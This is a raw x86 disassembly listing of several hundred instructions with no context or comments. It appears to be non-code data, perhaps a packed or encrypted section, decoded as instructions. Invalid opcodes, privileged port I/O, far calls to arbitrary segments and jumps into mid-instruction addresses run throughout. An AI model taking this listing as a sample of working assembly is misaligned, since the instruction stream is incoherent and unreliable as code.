  40f73d:	jns    0x40f768
  40f73f:	and    BYTE PTR [ebp+0x339e003d],al
  40f745:	dec    ecx
  40f746:	jg     0x40f765
  40f748:	loopne 0x40f702
  40f74a:	sub    al,0x4a
  40f74c:	test   edx,0x947c797b
  40f752:	bound  ebx,QWORD PTR [esi+ecx*1-0x30]
  40f756:	out    dx,al
  40f757:	loopne 0x40f746
  40f759:	mov    cl,0xbb
  40f75b:	sti    
  40f75c:	ficom  DWORD PTR [edx+eax*4]
  40f75f:	mov    ebp,0xb7827751
  40f764:	pop    eax
  40f765:	cmc    
  40f766:	(bad)  
  40f767:	mov    dl,bl
  40f769:	fiadd  WORD PTR [edx-0x8]
  40f76c:	mov    eax,ds:0x32c4612f
  40f771:	imul   BYTE PTR [esi-0x584367e2]
  40f777:	out    0x74,eax
  40f779:	fisub  DWORD PTR [eax-0x29]
  40f77c:	mov    al,ds:0x1b83ce69
  40f781:	pushf  
  40f782:	test   eax,0x23a9bad1
  40f787:	test   esi,0xeb0ff3f6
  40f78d:	add    DWORD PTR [edx-0x2e],ebx
  40f790:	pop    eax
  40f791:	cmp    DWORD PTR [esp+edx*1+0x50],esi
  40f795:	push   edx
  40f796:	and    edi,ebx
  40f798:	shl    al,1
  40f79a:	cwde   
  40f79b:	pop    edx
  40f79c:	in     al,dx
  40f79d:	add    eax,0xd303b4d6
  40f7a2:	xchg   esi,eax
  40f7a3:	test   ch,bl
  40f7a5:	lea    ebp,[ebp+esi*1-0x7c128381]
  40f7ac:	aas    
  40f7ad:	aaa    
  40f7ae:	mov    esi,0x1f03b557
  40f7b3:	test   dl,bh
  40f7b5:	mov    dl,0x2b
  40f7b7:	test   BYTE PTR [ebx+edx*2+0x3c89e068],bh
  40f7be:	mov    ecx,edi
  40f7c0:	jmp    0x40f7d1
  40f7c2:	lods   eax,DWORD PTR ds:[esi]
  40f7c3:	jp     0x40f799
  40f7c5:	sbb    al,BYTE PTR [edi-0x515f8236]
  40f7cb:	out    0x9e,al
  40f7cd:	push   ss
  40f7ce:	mov    ?,WORD PTR ds:0x36d8ab42
  40f7d4:	xlat   BYTE PTR ds:[ebx]
  40f7d5:	sbb    al,0x8d
  40f7d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7d8:	jp     0x40f796
  40f7da:	bound  ecx,QWORD PTR ds:0xa86fb736
  40f7e0:	call   0xd5aea561
  40f7e5:	mov    fs,ecx
  40f7e7:	int3   
  40f7e8:	inc    ebx
  40f7e9:	inc    edi
  40f7ea:	pushf  
  40f7eb:	cmp    eax,0xb93d6c3e
  40f7f0:	and    ah,BYTE PTR [eax-0x5]
  40f7f3:	loope  0x40f81a
  40f7f5:	mov    al,ds:0xcbc56437
  40f7fa:	xchg   ecx,eax
  40f7fb:	loop   0x40f7a5
  40f7fd:	xchg   ecx,eax
  40f7fe:	or     DWORD PTR [esi-0x4f],edx
  40f801:	jge    0x40f809
  40f803:	cmp    al,cl
  40f805:	scas   al,BYTE PTR es:[edi]
  40f806:	aas    
  40f807:	inc    DWORD PTR [esi]
  40f809:	sub    bh,BYTE PTR [eax+0x15e7788d]
  40f80f:	inc    eax
  40f810:	cmp    bh,BYTE PTR [ecx]
  40f812:	mov    ebx,0x6c2ad92c
  40f817:	xchg   ecx,eax
  40f818:	push   edx
  40f819:	loopne 0x40f86a
  40f81b:	(bad)  
  40f81c:	mov    edx,0x5fc9f94
  40f821:	mov    ebp,0xb7dc1998
  40f826:	in     eax,dx
  40f827:	xor    BYTE PTR [edx-0x22ade620],0xb9
  40f82e:	jg     0x40f87a
  40f830:	add    BYTE PTR [esi],dh
  40f832:	pushf  
  40f833:	je     0x40f7d7
  40f835:	xchg   BYTE PTR [ecx],dh
  40f837:	pop    ss
  40f838:	sbb    al,0x2
  40f83a:	and    edx,DWORD PTR [ebx]
  40f83c:	loope  0x40f806
  40f83e:	cmp    DWORD PTR [esi+0x25],ebx
  40f841:	and    ebx,DWORD PTR [esi+edx*2]
  40f844:	ins    BYTE PTR es:[edi],dx
  40f845:	imul   edi,DWORD PTR [edi],0x3
  40f848:	inc    ecx
  40f849:	ffreep st(5)
  40f84b:	xchg   ecx,eax
  40f84c:	mov    al,ds:0x9d35e5c8
  40f851:	xor    eax,0x3dae210c
  40f856:	pusha  
  40f857:	cdq    
  40f858:	dec    BYTE PTR [edi+ebp*1+0x5c]
  40f85c:	clc    
  40f85d:	and    al,0x8d
  40f85f:	dec    esp
  40f860:	or     bh,BYTE PTR [ebx+0x17]
  40f863:	(bad)  
  40f865:	jecxz  0x40f860
  40f867:	aam    0x0
  40f869:	fcmovu st,st(3)
  40f86b:	jb     0x40f899
  40f86d:	daa    
  40f86e:	push   es
  40f86f:	stc    
  40f870:	loopne 0x40f858
  40f872:	je     0x40f8de
  40f874:	shl    edx,1
  40f876:	call   0xfc60:0xee563c55
  40f87d:	dec    ecx
  40f87e:	es ja  0x40f8e3
  40f881:	hlt    
  40f882:	test   eax,0x9733bb35
  40f887:	inc    edx
  40f888:	fdivr  DWORD PTR [edi+0x760b5562]
  40f88e:	push   ecx
  40f88f:	shl    BYTE PTR [esi],cl
  40f891:	bound  ebp,QWORD PTR [esp+eax*1-0x711a6321]
  40f898:	dec    ebp
  40f899:	xor    al,0xa7
  40f89b:	stc    
  40f89c:	xchg   ebx,eax
  40f89d:	push   ebx
  40f89e:	push   edx
  40f89f:	jmp    0x40f915
  40f8a1:	push   ebx
  40f8a2:	scas   al,BYTE PTR es:[edi]
  40f8a3:	xor    eax,0x33f30373
  40f8a8:	jae    0x40f8c1
  40f8aa:	pop    es
  40f8ab:	dec    eax
  40f8ac:	xchg   ecx,eax
  40f8ad:	mov    esp,0x6649eaac
  40f8b2:	xchg   edx,eax
  40f8b3:	adc    DWORD PTR [ebx-0x56],0x31
  40f8b7:	int    0xcc
  40f8b9:	(bad)  
  40f8bb:	hlt    
  40f8bc:	jl     0x40f8ba
  40f8be:	xlat   BYTE PTR ds:[ebx]
  40f8bf:	aam    0xaa
  40f8c1:	push   esi
  40f8c2:	push   esi
  40f8c3:	cmp    eax,eax
  40f8c5:	cwde   
  40f8c6:	inc    esp
  40f8c7:	fistp  WORD PTR [ebx-0x3089afaf]
  40f8cd:	iret   
  40f8ce:	cld    
  40f8cf:	(bad)  
  40f8d0:	in     eax,0x3e
  40f8d2:	out    0x8c,al
  40f8d4:	stc    
  40f8d5:	push   ss
  40f8d6:	popa   
  40f8d7:	jg     0x40f89a
  40f8d9:	dec    ecx
  40f8da:	je     0x40f8ac
  40f8dc:	xor    edx,esi
  40f8de:	xchg   edi,eax
  40f8df:	cwde   
  40f8e0:	sti    
  40f8e1:	(bad)  
  40f8e2:	icebp  
  40f8e3:	jns    0x40f8b1
  40f8e5:	les    ebx,FWORD PTR [eax]
  40f8e7:	iret   
  40f8e8:	aad    0xed
  40f8ea:	ins    BYTE PTR es:[di],dx
  40f8ec:	jmp    0x40f95c
  40f8ee:	loopne 0x40f93f
  40f8f0:	dec    BYTE PTR [ecx-0x71867c15]
  40f8f6:	lds    esi,FWORD PTR [edi-0x36]
  40f8f9:	scas   eax,DWORD PTR es:[edi]
  40f8fa:	adc    eax,0xa442d8c1
  40f8ff:	scas   al,BYTE PTR es:[edi]
  40f900:	pusha  
  40f901:	jge    0x40f941
  40f903:	ja     0x40f8c3
  40f905:	iret   
  40f906:	mov    esi,0x5681afbd
  40f90b:	xchg   DWORD PTR [ebx-0x6dba94d5],ebx
  40f911:	jl     0x40f956
  40f913:	dec    ebp
  40f914:	xor    DWORD PTR [eax+0x6],0xffffff85
  40f918:	mov    bh,0xc8
  40f91a:	xchg   edx,eax
  40f91b:	jbe    0x40f928
  40f91d:	push   cs
  40f91e:	mov    esp,0xf32c5ff3
  40f923:	add    eax,0xf5dec911
  40f928:	and    al,0xe2
  40f92a:	cld    
  40f92b:	mov    ecx,DWORD PTR [ecx+0xe55fa55]
  40f931:	push   esp
  40f932:	and    cl,BYTE PTR [ecx+0x1e]
  40f935:	enter  0x938e,0xba
  40f939:	jle    0x40f8c2
  40f93b:	xor    BYTE PTR [ecx-0x6d388e05],dl
  40f941:	cs push ecx
  40f943:	push   edx
  40f944:	adc    dl,BYTE PTR [ebp+ebx*4+0x5e]
  40f948:	fs stos DWORD PTR es:[edi],eax
  40f94a:	in     al,dx
  40f94b:	jo     0x40f8d7
  40f94d:	sbb    DWORD PTR [ecx-0x30],ebp
  40f950:	cmp    bh,BYTE PTR [edx]
  40f952:	lahf   
  40f953:	neg    DWORD PTR [esi]
  40f955:	cwde   
  40f956:	cld    
  40f957:	sbb    ecx,DWORD PTR [ecx]
  40f959:	push   esi
  40f95a:	push   esi
  40f95b:	icebp  
  40f95c:	rol    dh,cl
  40f95e:	push   ss
  40f95f:	in     eax,0x65
  40f961:	push   ecx
  40f962:	fldcw  WORD PTR ds:0x24a9a44c
  40f968:	sbb    DWORD PTR [eax-0x2a],0xdb5771ab
  40f96f:	imul   ebp,DWORD PTR [ebx],0xffffffd4
  40f972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f973:	dec    edi
  40f974:	cmp    bh,BYTE PTR [edi+0x2f]
  40f977:	xor    eax,eax
  40f979:	adc    BYTE PTR [ecx],0x34
  40f97c:	and    DWORD PTR [ebp+0x21],ebx
  40f97f:	pop    esp
  40f980:	mov    esi,ebp
  40f982:	sbb    eax,DWORD PTR [ecx+0x19]
  40f985:	aas    
  40f986:	and    al,0xa0
  40f988:	cmp    BYTE PTR [esi-0x4e],bl
  40f98b:	in     eax,0xb8
  40f98d:	mov    dl,0x9d
  40f98f:	mov    ds:0x581e94da,al
  40f994:	(bad)  
  40f995:	jne    0x40f9f2
  40f997:	mov    edx,0xf608dff6
  40f99c:	mov    ecx,0xd78444bb
  40f9a1:	fst    DWORD PTR [edi+0x6d]
  40f9a4:	dec    esp
  40f9a5:	retf   0x5ccd
  40f9a8:	jnp    0x40fa01
  40f9aa:	fs adc al,0xbc
  40f9ad:	sahf   
  40f9ae:	fidiv  DWORD PTR [esi]
  40f9b0:	lods   al,BYTE PTR ds:[esi]
  40f9b1:	sub    eax,0x56a2c52
  40f9b6:	mov    eax,0x12167991
  40f9bb:	xchg   ebx,eax
  40f9bc:	dec    esp
  40f9bd:	xchg   edi,eax
  40f9be:	rcl    BYTE PTR [ebp+esi*2+0x8],cl
  40f9c2:	sbb    al,BYTE PTR [ebx]
  40f9c4:	mov    ds:0xe8edd368,al
  40f9c9:	xor    cl,BYTE PTR ds:0x9d3207aa
  40f9cf:	adc    dl,BYTE PTR [edx+ebx*2]
  40f9d2:	cmp    DWORD PTR [eax],edx
  40f9d4:	mov    dl,0x37
  40f9d6:	ins    BYTE PTR es:[edi],dx
  40f9d7:	sub    DWORD PTR [edi+0x1],ecx
  40f9da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9db:	rol    edi,0x23
  40f9de:	xchg   BYTE PTR [ecx-0x50e383d8],dl
  40f9e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9e5:	mov    al,ds:0x8eab95ad
  40f9ea:	test   al,0x1b
  40f9ec:	pop    ds
  40f9ed:	neg    eax
  40f9ef:	out    dx,eax
  40f9f0:	add    BYTE PTR [edi],ah
  40f9f2:	add    eax,0x89c6e1d0
  40f9f7:	cdq    
  40f9f8:	pop    ds
  40f9f9:	inc    ecx
  40f9fa:	xor    bl,ah
  40f9fc:	push   edx
  40f9fd:	ffreep st(3)
  40f9ff:	xor    dl,bh
  40fa01:	mov    ecx,0xa3adc4e5
  40fa06:	shr    DWORD PTR ss:[ebp-0x41],1
  40fa0a:	jo     0x40f9ba
  40fa0c:	std    
  40fa0d:	mov    edx,0x74fe955c
  40fa12:	rcr    BYTE PTR [edx-0x6e],cl
  40fa15:	call   0x4290:0xd3e887bc
  40fa1c:	scas   al,BYTE PTR es:[edi]
  40fa1d:	(bad)  
  40fa1e:	adc    al,0xff
  40fa20:	pushf  
  40fa21:	mov    ch,0x33
  40fa23:	inc    eax
  40fa24:	pop    es
  40fa25:	sub    DWORD PTR [ebx-0x66],esp
  40fa28:	stc    
  40fa29:	adc    cl,BYTE PTR [edi]
  40fa2b:	mov    edx,0xaa801840
  40fa30:	jns    0x40fa35
  40fa32:	jge    0x40fa56
  40fa34:	pusha  
  40fa35:	lds    ebp,FWORD PTR [edx+ebp*2-0x75]
  40fa39:	jb     0x40fa92
  40fa3b:	mov    bh,0xeb
  40fa3d:	mov    ch,BYTE PTR [edi+ecx*1+0x25]
  40fa41:	fs and eax,0x34ef97e6
  40fa47:	mov    esi,0xaa81c876
  40fa4c:	cmp    dh,BYTE PTR [ebp-0x401bb552]
  40fa52:	jle    0x40faa9
  40fa54:	jge    0x40fa26
  40fa56:	pop    ebp
  40fa57:	push   ebx
  40fa58:	cdq    
  40fa59:	push   esi
  40fa5a:	je     0x40faa4
  40fa5c:	dec    edx
  40fa5d:	pmaxub mm7,QWORD PTR ds:0xbf93180d
  40fa64:	mov    ds:0xea89d7c2,eax
  40fa69:	xor    bl,0x34
  40fa6c:	and    DWORD PTR [esi+0xe],ecx
  40fa6f:	inc    eax
  40fa70:	adc    ch,BYTE PTR [ebx]
  40fa72:	call   0x3f67764e
  40fa77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa78:	jns    0x40fa7f
  40fa7a:	sbb    al,BYTE PTR [ebx-0x50db044f]
  40fa80:	mov    bh,0xfe
  40fa82:	and    BYTE PTR [edi-0x30],0xe1
  40fa86:	fcmovu st,st(6)
  40fa88:	mov    ah,0xb6
  40fa8a:	jo     0x40fa93
  40fa8c:	int    0x21
  40fa8e:	mov    esi,0x59969e3f
  40fa93:	ins    BYTE PTR es:[edi],dx
  40fa94:	loop   0x40fac8
  40fa96:	fcmove st,st(2)
  40fa98:	jmp    0xaaf8:0xcea6bb1d
  40fa9f:	adc    bl,bl
  40faa1:	and    DWORD PTR [edi-0x76c4ba0d],0x26
  40faa8:	punpcklbw mm1,DWORD PTR [esi-0x7799dae6]
  40faaf:	push   cs
  40fab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fab1:	not    BYTE PTR [ecx+0x73daca5]
  40fab7:	mov    BYTE PTR ds:[ebp+0x65],ah
  40fabb:	scas   al,BYTE PTR es:[edi]
  40fabc:	fisttp QWORD PTR [eax-0x33cb6030]
  40fac2:	popf   
  40fac3:	int3   
  40fac4:	shr    BYTE PTR [edi],0xc7
  40fac7:	jb     0x40faea
  40fac9:	out    dx,eax
  40faca:	or     bl,BYTE PTR [esi+edx*1+0x2c]
  40face:	jl     0x40faa3
  40fad0:	mov    edi,ds
  40fad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fad3:	pop    edx
  40fad4:	bound  eax,QWORD PTR [eax-0x3d60261f]
  40fada:	push   ebp
  40fadb:	ret    0x892b
  40fade:	inc    esp
  40fadf:	xchg   ebp,eax
  40fae0:	or     ah,bl
  40fae2:	sbb    BYTE PTR [edx-0x13],ah
  40fae5:	jno    0x40faca
  40fae7:	call   0x37d4:0xbcd99da0
  40faee:	outs   dx,DWORD PTR ds:[esi]
  40faef:	popa   
  40faf0:	xor    dh,BYTE PTR [esi-0x5e]
  40faf3:	pop    ds
  40faf4:	mov    dh,0xfd
  40faf6:	std    
  40faf7:	std    
  40faf8:	push   eax
  40faf9:	rsm    
  40fafb:	data16 and al,0x3a
  40fafe:	sti    
  40faff:	in     eax,0xa
  40fb01:	xor    esp,DWORD PTR [ebp+0x7d77c627]
  40fb07:	ficom  DWORD PTR ds:0x101dc4e4
  40fb0d:	or     edx,DWORD PTR [edx]
  40fb0f:	gs stc 
  40fb11:	not    ah
  40fb13:	cmc    
  40fb14:	cs sub eax,0x3f6a672f
  40fb1a:	ffree  st(0)
  40fb1c:	out    0x8d,al
  40fb1e:	inc    ebp
  40fb1f:	lock sub DWORD PTR [ecx+0x6f],edi
  40fb23:	(bad)
  40fb26:	or     eax,0x1bb2057
  40fb2b:	stos   BYTE PTR es:[edi],al
  40fb2c:	xchg   ebx,eax
  40fb2d:	in     eax,0xe0
  40fb2f:	je     0x40faea
  40fb31:	jge    0x40fb03
  40fb33:	cmp    DWORD PTR [ebx+ebp*8-0x55],ebp
  40fb37:	stos   BYTE PTR es:[edi],al
  40fb38:	repnz std 
  40fb3a:	dec    esp
  40fb3b:	cmp    DWORD PTR [esi+0xb2745fe],esi
  40fb41:	ret    
  40fb42:	and    bl,dl
  40fb44:	lods   al,BYTE PTR ds:[esi]
  40fb45:	gs cmc 
  40fb47:	call   0xb3c01ad7
  40fb4c:	add    al,0xd1
  40fb4e:	sbb    edi,DWORD PTR [eax]
  40fb50:	in     eax,dx
  40fb51:	pusha  
  40fb52:	xor    ebx,DWORD PTR [eax]
  40fb54:	pusha  
  40fb55:	test   eax,0xc09e03cc
  40fb5a:	mov    ds:0xfaf3b86d,al
  40fb5f:	cmp    bl,bh
  40fb61:	aad    0xa1
  40fb63:	enter  0x5bfd,0xda
  40fb67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb68:	mov    ds,esp
  40fb6a:	mov    DWORD PTR [edx+0x30],0x867e214
  40fb71:	sub    BYTE PTR [edx],cl
  40fb73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb74:	inc    esp
  40fb75:	inc    edx
  40fb76:	inc    edx
  40fb77:	push   0xb6da24d1
  40fb7c:	jmp    0xe5b:0x27c5d893
  40fb83:	push   ecx
  40fb84:	mov    WORD PTR [ebp+0x646fb2d2],es
  40fb8a:	xlat   BYTE PTR ds:[ebx]
  40fb8b:	div    al
  40fb8d:	call   0xcbe104f9
  40fb92:	js     0x40fb99
  40fb94:	jb     0x40fb47
  40fb96:	lock dec esi
  40fb98:	jo     0x40fc00
  40fb9a:	neg    DWORD PTR [eax]
  40fb9c:	lods   al,BYTE PTR ds:[esi]
  40fb9d:	jb     0x40fb6a
  40fb9f:	pop    ecx
  40fba0:	adc    eax,0xf38ce036
  40fba5:	jle    0x40fbcd
  40fba7:	sub    ecx,edi
  40fba9:	stc    
  40fbaa:	pmulhw mm5,mm0
  40fbad:	add    BYTE PTR [ebx],0x83
  40fbb0:	sbb    eax,0x4fe2bf90
  40fbb5:	iret   
  40fbb6:	mov    DWORD PTR [ebp-0x58643a40],0x8007e835
  40fbc0:	dec    ebx
  40fbc1:	rcr    DWORD PTR [eax],0xce
  40fbc4:	xchg   DWORD PTR [edi-0x13],ebp
  40fbc7:	out    dx,eax
  40fbc8:	(bad)  
  40fbca:	dec    edi
  40fbcb:	jno    0x40fc11
  40fbcd:	imul   ebx,ebp,0xb1a6a7cf
  40fbd3:	lods   al,BYTE PTR ds:[esi]
  40fbd4:	loop   0x40fbde
  40fbd6:	call   0xb1fb:0xc0f180c
  40fbdd:	jno    0x40fbdc
  40fbdf:	(bad)  
  40fbe0:	mov    esp,0x2a82687d
  40fbe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbe6:	mov    ds:0x6d78588c,al
  40fbeb:	ficom  DWORD PTR [esi]
  40fbed:	fwait
  40fbee:	pop    DWORD PTR [ebp-0x4e9dbc00]
  40fbf4:	and    edi,DWORD PTR [ecx-0x4f]
  40fbf7:	or     eax,0x97f22811
  40fbfc:	mov    dl,BYTE PTR [ecx+0x681bb815]
  40fc02:	cwde   
  40fc03:	pop    eax
  40fc04:	sub    BYTE PTR [ebx+esi*8],cl
  40fc07:	fdiv   DWORD PTR [esi+0x5f]
  40fc0a:	adc    BYTE PTR [ebp+eax*1+0x78],bl
  40fc0e:	pusha  
  40fc0f:	add    ax,WORD PTR [esi]
  40fc12:	sub    BYTE PTR [ecx-0x6bda22d8],0x3b
  40fc19:	gs enter 0x3faf,0xc2
  40fc1e:	inc    ecx
  40fc1f:	stos   BYTE PTR es:[edi],al
  40fc20:	sbb    al,0xc0
  40fc22:	jg     0x40fc6a
  40fc24:	push   es
  40fc25:	clc    
  40fc26:	xchg   BYTE PTR [edi+eax*1],bl
  40fc29:	addr16 mov ebp,0x533a2f69
  40fc2f:	push   edi
  40fc30:	cs push ss
  40fc32:	add    DWORD PTR [ebx+0x15],edx
  40fc35:	mov    ds:0xeb12a05d,eax
  40fc3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc3b:	lods   al,BYTE PTR ds:[esi]
  40fc3c:	inc    edx
  40fc3d:	jno    0x40fc4b
  40fc3f:	add    esp,DWORD PTR [edi+0x13]
  40fc42:	fiadd  WORD PTR [eax-0x11a9a1a9]
  40fc48:	push   cs
  40fc49:	lds    edi,FWORD PTR [ecx]
  40fc4b:	inc    edi
  40fc4c:	cld    
  40fc4d:	pop    ss
  40fc4e:	mov    bh,0xb2
  40fc50:	add    al,0x42
  40fc52:	(bad)  
  40fc53:	ins    DWORD PTR es:[edi],dx
  40fc54:	inc    esp
  40fc55:	mov    ebx,0xbef36a13
  40fc5a:	pushfw 
  40fc5c:	adc    eax,0xea2f0682
  40fc61:	mov    BYTE PTR [edx],cl
  40fc63:	pop    ebx
  40fc64:	xchg   BYTE PTR ds:0xfd2a9397,ch
  40fc6a:	xor    cl,BYTE PTR [eax]
  40fc6c:	mov    ds:0xfbd2f8eb,eax
  40fc71:	jae    0x40fce3
  40fc73:	adc    BYTE PTR [edi],0xcf
  40fc76:	(bad)  
  40fc77:	push   ss
  40fc78:	jg     0x40fc03
  40fc7a:	or     BYTE PTR [ecx+0x14262587],bl
  40fc80:	jg     0x40fc30
  40fc82:	xor    esi,DWORD PTR [edi+0x46570d8c]
  40fc88:	mov    ds:0x12df62aa,eax
  40fc8d:	push   0xffffffa7
  40fc8f:	leave  
  40fc90:	fwait
  40fc91:	push   ss
  40fc92:	sbb    ebx,ecx
  40fc94:	inc    eax
  40fc95:	sub    al,0xc4
  40fc97:	ds dec eax
  40fc99:	loop   0x40fcc5
  40fc9b:	xor    BYTE PTR [ebp+0x19595797],bh
  40fca1:	jge    0x40fca4
  40fca3:	xchg   dh,ch
  40fca5:	pusha  
  40fca6:	add    edx,DWORD PTR ds:0xf21959b1
  40fcac:	or     al,0x0
  40fcae:	sub    eax,DWORD PTR [esi-0x18fe268]
  40fcb4:	xchg   ecx,eax
  40fcb5:	mov    ah,0xc
  40fcb7:	jno    0x40fc69
  40fcb9:	call   0xc3a74bf
  40fcbe:	mov    ebp,0x3e2ba598
  40fcc3:	jg     0x40fc4d
  40fcc5:	mov    ah,0xbe
  40fcc7:	and    al,0x5c
  40fcc9:	sub    cl,BYTE PTR [edx+0x1a4ffa3a]
  40fccf:	jmp    0x40fce5
  40fcd1:	mov    eax,ds:0x5f3e7889
  40fcd6:	stc    
  40fcd7:	rcr    BYTE PTR ds:0x7a5ce7ac,cl
  40fcdd:	repnz (bad) 
  40fcdf:	mov    eax,DWORD PTR [eax+edi*2-0x58]
  40fce3:	pusha  
  40fce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fce5:	push   0x64
  40fce7:	jnp    0x40fcd9
  40fce9:	xor    al,0xf1
  40fceb:	xlat   BYTE PTR ds:[ebx]
  40fcec:	ror    BYTE PTR [edi],cl
  40fcee:	or     eax,0x457b77db
  40fcf3:	xchg   BYTE PTR [ebp-0xcfc0881],dl
  40fcf9:	jmp    0x40fd34
  40fcfb:	ret    0xe948
  40fcfe:	mov    dh,0x1
  40fd00:	js     0x40fcec
  40fd02:	mov    ebx,0xbadfc939
  40fd07:	mov    ecx,0xae50a11e
  40fd0c:	push   ss
  40fd0d:	inc    ecx
  40fd0e:	jne    0x40fd0a
  40fd10:	sbb    al,BYTE PTR [ebx-0x51]
  40fd13:	fwait
  40fd14:	bnd ret 
  40fd16:	xlat   BYTE PTR ds:[ebx]
  40fd17:	push   ebp
  40fd18:	nop
  40fd19:	scas   al,BYTE PTR es:[edi]
  40fd1a:	out    dx,eax
  40fd1b:	sub    ah,BYTE PTR [eax+0x3114e0f9]
  40fd21:	pusha  
  40fd22:	shl    BYTE PTR [ebx],0xdb
  40fd25:	dec    dx
  40fd27:	jl     0x40fd16
  40fd29:	icebp  
  40fd2a:	pop    eax
  40fd2b:	jb     0x40fd9e
  40fd2d:	test   DWORD PTR [ecx-0x779a65f8],0x8bbbd838
  40fd37:	adc    edi,DWORD PTR [edx+0x29e5ef99]
  40fd3d:	dec    edi
  40fd3e:	loope  0x40fcd3
  40fd40:	mov    esi,0xffd32ca3
  40fd45:	dec    esp
  40fd46:	xchg   ecx,eax
  40fd47:	out    dx,al
  40fd48:	jmp    0x40fd98
  40fd4a:	aaa    
  40fd4b:	jmp    0x40fcdc
  40fd4d:	push   ecx
  40fd4e:	stos   BYTE PTR es:[edi],al
  40fd4f:	mov    esi,0x2c3cf40a
  40fd54:	(bad)  
  40fd55:	xchg   edi,eax
  40fd56:	jno    0x40fcf3
  40fd58:	imul   esi,DWORD PTR [ebx],0xfffffff1
  40fd5b:	popa   
  40fd5c:	adc    al,0x34
  40fd5e:	jg     0x40fd4a
  40fd60:	xchg   BYTE PTR [bp+0x4d89],bh
  40fd65:	push   es
  40fd66:	cld    
  40fd67:	xchg   edx,eax
  40fd68:	mov    dh,0xd4
  40fd6a:	imul   ecx,ecx,0xfffffff5
  40fd6d:	mov    dl,0xff
  40fd6f:	or     BYTE PTR [edi],cl
  40fd71:	jge    0x40fdb1
  40fd73:	les    ebp,FWORD PTR [ebx-0xc]
  40fd76:	fs nop
  40fd78:	scas   al,BYTE PTR es:[edi]
  40fd79:	pop    ss
  40fd7a:	xlat   BYTE PTR ds:[ebx]
  40fd7b:	sahf   
  40fd7c:	test   BYTE PTR [esp+eax*8-0x46a08bbf],dl
  40fd83:	aaa    
  40fd84:	inc    esi
  40fd85:	pop    ebp
  40fd86:	sub    BYTE PTR [edi+0x22],dl
  40fd89:	dec    edi
  40fd8a:	mov    dl,0xb6
  40fd8c:	push   ds
  40fd8d:	or     DWORD PTR [ebx-0x4696be60],edi
  40fd93:	imul   ebx,DWORD PTR [ebx+eiz*2],0x2d
  40fd97:	jb     0x40fd97
  40fd99:	imul   esi,DWORD PTR [edx+edi*1-0x737fdf2],0x7d
  40fda1:	add    ah,BYTE PTR [esi+ebp*2+0x3a94d19b]
  40fda8:	call   0xc8b1:0x7847d3c3
  40fdaf:	pop    ds
  40fdb0:	inc    esp
  40fdb1:	push   edx
  40fdb2:	pop    esi
  40fdb3:	and    DWORD PTR [eax-0x46],ebx
  40fdb6:	rcl    DWORD PTR [ebx-0x5ba1694],0x4
  40fdbd:	sbb    ah,0x50
  40fdc0:	cdq    
  40fdc1:	scas   al,BYTE PTR es:[edi]
  40fdc2:	test   eax,0x2f6d37d3
  40fdc7:	ret    0x1d09
  40fdca:	in     al,dx
  40fdcb:	shl    DWORD PTR [edi-0x46a88178],1
  40fdd1:	pusha  
  40fdd2:	arpl   WORD PTR [ebx+0xb608475],bx
  40fdd8:	xor    eax,0xad61d944
  40fddd:	or     edi,DWORD PTR [ecx+ebp*4+0x631602aa]
  40fde4:	mov    eax,0x9ef8c94a
  40fde9:	dec    BYTE PTR [edx-0x48d43319]
  40fdef:	ja     0x40fd9b
  40fdf1:	xchg   DWORD PTR [edx+ebp*4-0x14],ebx
  40fdf5:	sahf   
  40fdf6:	daa    
  40fdf7:	rcl    ebp,0xef
  40fdfa:	aad    0xf6
  40fdfc:	aad    0xc3
  40fdfe:	push   ebp
  40fdff:	(bad)  
  40fe00:	pusha  
  40fe01:	or     DWORD PTR [edi+0x59],esi
  40fe04:	mov    ch,0xe3
  40fe06:	lds    edi,FWORD PTR [ebx+0x4a]
  40fe09:	pop    esp
  40fe0a:	xchg   esp,eax
  40fe0b:	gs xchg ebp,eax
  40fe0d:	mov    esp,0x3252c8fe
  40fe12:	jae    0x40fda9
  40fe14:	mov    ebp,eax
  40fe16:	iret   
  40fe17:	add    edi,edx
  40fe19:	sahf   
  40fe1a:	stc    
  40fe1b:	inc    esi
  40fe1c:	xchg   edx,eax
  40fe1d:	mov    eax,DWORD PTR [bx+di+0x6646]
  40fe22:	and    al,0x7
  40fe24:	pop    esp
  40fe25:	xor    ebp,esi
  40fe27:	sbb    cl,BYTE PTR [edx+0x7789024b]
  40fe2d:	xchg   BYTE PTR [esi+0x12ef7b7c],ah
  40fe33:	ret    0x5781
  40fe36:	jp     0x40fe5f
  40fe38:	xor    eax,DWORD PTR [ebx-0x5a9cb8dc]
  40fe3e:	mov    ds:0x19def3e7,al
  40fe43:	retf   
  40fe44:	xchg   DWORD PTR [esp+eiz*8],ebx
  40fe47:	pop    ebx
  40fe48:	outs   dx,BYTE PTR ds:[esi]
  40fe49:	(bad)  
  40fe4a:	push   ebp
  40fe4b:	inc    eax
  40fe4c:	jl     0x40fde6
  40fe4e:	adc    al,ch
  40fe50:	jmp    0xf01324b0
  40fe55:	push   edx
  40fe56:	mov    dh,0x3d
  40fe58:	add    DWORD PTR ds:0x2b234441,0x51737865
  40fe62:	xchg   sp,ax
  40fe64:	mov    DWORD PTR [ebx],edx
  40fe66:	outs   dx,DWORD PTR ds:[esi]
  40fe67:	add    eax,0x339a149c
  40fe6c:	inc    eax
  40fe6d:	mov    dh,0x78
  40fe6f:	out    dx,al
  40fe70:	xor    dl,ch
  40fe72:	fstp   st(7)
  40fe74:	jp     0x40fe6b
  40fe76:	sbb    esi,ebp
  40fe78:	push   esp
  40fe79:	arpl   WORD PTR [ecx],sp
  40fe7b:	jp     0x40feb1
  40fe7d:	push   esp
  40fe7e:	jp     0x40fea3
  40fe80:	lods   eax,DWORD PTR ds:[esi]
  40fe81:	hlt    
  40fe82:	out    0x9e,eax
  40fe84:	lahf   
  40fe85:	neg    DWORD PTR [ebx]
  40fe87:	xor    cl,BYTE PTR [edx-0x7df8a90b]
